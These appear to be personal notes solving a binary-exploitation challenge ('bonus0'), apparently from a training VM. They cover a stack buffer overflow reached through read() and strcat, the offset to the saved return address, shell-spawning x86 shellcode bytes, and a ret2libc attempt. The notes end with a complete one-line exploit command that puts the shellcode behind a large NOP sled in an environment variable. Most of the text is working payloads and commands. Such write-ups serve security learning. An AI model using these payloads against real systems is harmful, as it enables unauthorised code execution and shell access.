main calls pp, pp seems to return a string which is then printed by the main
pp calls p 2 times, so we guess p is the function which fetch inputs and returns it
Except p doesn't use gets but read(0, buf, 0x1000 (4096)), the buffer is allocated on the stack

then p calls strchr(buf, 0xa ('\n')) and replaces it with '\0' (since read doesn't add \0)


main eip save = 0xb7e454d3 (0xb7e454d3	0x00000001	0xbffff7a4	0xbffff7ac)

buffer starts at 0xbffff6d4 (in reality 0xbffff6d8 but keep aligned)
need to put 36 bytes to reach eip save

8+8+4+4+4+4+4

since it copies at most 20, we need to do 18 18

after messing around, theses values:
AAAAAAAAAAAAAAAAAAAA
BBBBBBBBBBBBBBBBB

make it so that we reach eip save, so we just need 4 more bytes to override eip
but if we put more bytes, idk why but the offset changes

AAAAAAAAAAAAAAAAAAAA
BBBBBBBBBBBBBBBBBCCCC

now EIP save is located 8 bytes before CCCC, so like this:
AAAAAAAAAAAAAAAAAAAA
BBBBBBBBBXXXXBBBBBBBB

and now XXXX replaces eip save


"A"*20 + "B"*9 + "X"*4 + "B"*8

since it reads 4096, to use a script we need to print <20 chars> <\n> <missing padding for 4096> <20 chars> <\n>

like this
"A"*10 + "\n" + "A"*4085 + "B"*10 + "\n" (this prints 10 A's and 10 B's)

in our case we need:
run < <(python -c 'print "A"*20 + "\n" + "X"*4075 + "B"*9 + "\xff"*4 + "B"*8 + "\n"')

And is successfully tries to jump to 0xffffffff, now we need a shellcode like before, except we need a short one (shorted than 29)
Looking at this http://shell-storm.org/shellcode/index.html, we need a linux/x86 <= 29
http://shell-storm.org/shellcode/files/shellcode-841.html this shellcode works on the vm and is 21 bytes long, we can try this

"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

we still need to split it since max buffer is 20 then they are strcat'ed
"\x90"*8 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68" + "\n" + "X"*4075 + "\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\xff"*4 + "B"*8 + "\n"

Analyzing the stack we successfully have [ NOP sled (8) ] [ Shellcode ] [ 0xffffffff ], the shellcode is full so it should work if we put the right address
in gdb, shellcode address (middle of NOP sled) is 0xbffff6d8

so :
"\x90"*8 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68" + "\n" + "X"*4075 + "\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\xd8\xf6\xff\xbf" + "B"*8 + "\n"
In gdb it successfully runs a shell
But to find correct stack offset outside gdb is a pain and we coulnd't figure so we try ret2libc

system address  : 0xb7e6b060
/bin/sh address : 0xb7f8cc58 

We need to remove some NOP in order to fit [ system addr ] [ 4 random bytes ] [ system argument ], so :

"\x90"*4 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" + "\n" + "X"*4075 + "\x6e\x89\xe3\xcd\x80" + "\x60\xb0\xe6\xb7" + "C"*4 + "\x58\xcc\xf8\xb7" + "B"*4 + "\n"


"\x90"*8 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68" + "\n" + "X"*4075 + "\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x60\xb0\xe6\xb7" + "B"*8 + "\n"

We cannot we need 1 mor ebyte in buffer, but we can try to put the shellcode in env variable with a very big NOP sled (like 1000) so that gdb stack difference should not influence too much

env -i SHELL="/bin/bash" PWD="$HOME" SHELLCODE="$(python -c 'print "\x90"*1000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')"

x/s *((char **) environ) = "SHELLCODE=<shellcode>" (0xbffffb98)
0xbffffb98+0xa = <shellcode>


Since we added 1000 NOps, we try to jump right in the middle so that we have a safety net of around 500 NOPs
so we jump to 0xbffffb98+0xa+0x1F4 (0x1F4=500) = 0xBFFFFD96

So full input :
"\x90"*8 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68" + "\n" + "X"*4075 + "\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "\x96\xfd\xff\xbf" + "B"*8 + "\n"

Again, it works in GDB, but not outside it, but we now can use the previous shellcode which reopens stdin, and it might work with the ssh
We can also remove the shellcode from input since now it's from environment

env -i SHELL="/bin/bash" PWD="$HOME" SHELLCODE="$(python -c 'print "\x90"*1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')"
"\x90"*8 + "A"*12 + "\n" + "X"*4075 + "B"*9 + "\x96\xfd\xff\xbf" + "B"*8 + "\n"

Annddd, it works :D, so the short shellcode doesn't work with ssh connection (it only execve, so it has to do with tty)
final command:
env -i SHELL="/bin/bash" PWD="$HOME" SHELLCODE="$(python -c 'print "\x90"*1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')" ./bonus0 < <(python -c 'print "\x90"*8 + "A"*12 + "\n" + "X"*4075 + "B"*9 + "\x96\xfd\xff\xbf" + "B"*8 + "\n"')